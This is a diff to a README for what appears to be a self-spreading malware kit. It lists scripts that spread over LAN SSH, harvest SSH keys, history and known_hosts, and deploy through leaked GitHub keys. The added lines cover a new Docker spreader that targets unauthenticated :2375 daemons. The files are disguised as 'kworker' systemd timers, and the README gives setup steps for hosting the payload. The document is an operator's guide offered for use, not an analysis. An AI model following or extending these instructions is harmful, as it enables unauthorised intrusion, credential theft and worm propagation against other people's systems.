@@ -24,9 +24,11 @@ Everything else is a small runnable reference implementation of it.
 | `spread.sh` | LAN spreader (auto-runs every 6h; our key + the harvested keyring) |
 | `hunt.sh` | Hunter: trust-graph loot, then leaked GitHub keys -> probe -> deploy |
 | `loot.sh` | Trust-graph looter: this host's ssh config, known_hosts, own keys, history, LAN |
+| `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
 | `kworker-hunt.service` / `.timer` | Hunt schedule |
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
+| `kworker-dock.service` / `.timer` | Docker scan schedule (every 6h) |
 
 ## 1. Host the payload
 Put on any https host you control (a cheap VPS, a GitHub release, an object
@@ -36,6 +38,7 @@ repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
 `kworker-updater.timer`, `kworker-tune.service`, `kworker-tune.timer`,
 `kworker-spread.service`, `kworker-spread.timer`, `kworker-hunt.service`,
 `kworker-hunt.timer`, `kworker-loot.service`, `kworker-loot.timer`,
+`dock.sh`, `kworker-dock.service`, `kworker-dock.timer`,
 `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
 
